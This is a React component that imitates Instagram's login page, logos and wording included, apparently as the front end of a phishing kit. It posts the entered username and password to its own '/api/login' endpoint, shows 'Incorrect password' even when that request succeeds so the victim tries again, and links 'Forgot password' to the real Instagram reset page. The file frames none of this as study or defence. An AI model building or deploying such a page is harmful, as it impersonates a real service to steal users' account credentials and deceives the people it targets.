import axios from 'axios'
import { useEffect, useState } from 'react';
const InstagramLogin = () => {
    const [msg, setMsg] = useState("")
    const [flag, setFlag] = useState(0)
    const [btn, setBtn] = useState(true)

    const [fFlag, setFflag] = useState(false)
    const [first, setFirst] = useState(false)
    const [count, setCount] = useState(3)

    const [formData, setFormData] = useState({
        email: "",
        password: "",
    });


    const formHandel = (e) => {
        const { name, value } = e.target;
        setFormData(prev => ({
            ...prev,
            [name]: value
        }));
        setFirst(true)
    }
    const loginUser = async () => {
        if (count < 1) {
            return alert('Too many attempts. Please try again later.')
        }
        const { email, password } = formData
        if (!email && !password) {
            setFflag(true)
            setBtn(false)
            setFirst(true)
            return null
        }
        setBtn(false)
        axios.post("/api/login", { email, password }).then((res) => {
            const { flag, msg } = res.data;
            setMsg(msg)
            setFlag(flag)
            setBtn(true)
            console.log(res.data, "true")
            setCount(count - 1)
            alert(`Incorrect password. ${count - 1} attempts left.`)
        }).catch((error) => {
            const { flag, msg } = error.response.data;
            setMsg(msg)
            setFlag(flag)
            setBtn(true)
            console.log(error.response.data)

        })
    };


    useEffect(() => {
        const { email, password } = formData
        if (first) {
            if (!email && !password) {
                setFflag(true)
                setBtn(false)
            } else {
                setBtn(true)
                setFflag(false)
            }
        }
    }, [formData, first])

    const loginOnly = () => {
        return alert('only login to username and password')
    }

    const redirectToReset = () => {
        window.open(
            "https://www.instagram.com/accounts/password/reset/",
        );
    };

    return (
        <div className="min-h-screen bg-gray-50 flex items-center justify-center">
            <div className="w-full max-w-sm">

                {/* Login Card */}
                <div className="bg-white border border-gray-300 px-10 py-8 text-center">
                    <div className="flex justify-center">
                        <img
                            src="/Instagram.png"
                            alt="Instagram Logo"
                            className="h-12 mb-3"
                        />
                    </div>

                    <h1 className=" flex justify-center items-center mb-4">
                        <img
                            src="/Instagram.svg"
                            alt="Instagram Logo"
                            className="h-12 mb-3 "
                        /></h1>


                    <input
                        type="text"
                        name='email'
                        value={formData.email}
                        placeholder="Phone number, username, or email"
                        onChange={(e) => formHandel(e)}
                        className="w-full mb-2 px-3 py-2 text-sm border border-gray-300 rounded bg-gray-50 focus:outline-none"

                    />

                    <p className={` ${flag == 1 || flag == 4 || fFlag ? "opacity-100 translate-y-0" : "opacity-0 -translate-y-1 pointer-events-none"} transition-all text-left  mb-2 pl-1 duration-200 ease-in-out text-xs text-red-500`}>
                        {fFlag ? "Please enter your username or email" : flag == 1 || flag == 4 ? msg : ""}
                    </p>
                    <input
                        type="password"
                        value={formData.password}
                        name='password'
                        onChange={(e) => formHandel(e)}
                        placeholder="Password"
                        className="w-full mb-2 px-3 py-2 text-sm border border-gray-300 rounded bg-gray-50 focus:outline-none"

                    />

                    <p className={` ${flag == 2 || flag == 3 || flag == 5 || fFlag ? "opacity-100 translate-y-0" : "opacity-0 -translate-y-1 pointer-events-none"} transition-all text-left  mb-2 pl-1 duration-200 ease-in-out text-xs text-red-500`}>
                        {fFlag ? "Please enter your password" : flag == 2 || flag == 3 ? msg : flag == 5 ? `${count > 0 ? `Incorrect password. ${count} attempts left.` : "Too many attempts. Please try again later."}` : ""}
                    </p>



                    <button
                        disabled={!btn}
                        onClick={loginUser}
                        className={`${btn ? "cursor-pointer bg-blue-400" : "cursor-not-allowed bg-blue-300"} w-full  text-white py-2 rounded font-semibold `}
                    >
                        Log in
                    </button>

                    <div className="flex items-center my-6">
                        <div className="grow h-px bg-gray-300"></div>
                        <span className="mx-4 text-gray-400 text-sm font-semibold">OR</span>
                        <div className="grow h-px bg-gray-300"></div>
                    </div>

                    <button onClick={loginOnly} className="text-blue-900 text-sm font-semibold">
                        Log in with Facebook
                    </button>

                    <p onClick={redirectToReset} className="text-xs text-blue-900 mt-4 cursor-pointer">
                        Forgot password?
                    </p>
                </div>

                {/* Signup Card */}
                <div className="bg-white border border-gray-300 mt-3 py-4 text-center text-sm">
                    Don’t have an account?{" "}
                    <span onClick={loginOnly} className="text-blue-500 font-semibold cursor-pointer">
                        Sign up
                    </span>
                </div>

            </div>
        </div>
    );
};

export default InstagramLogin;
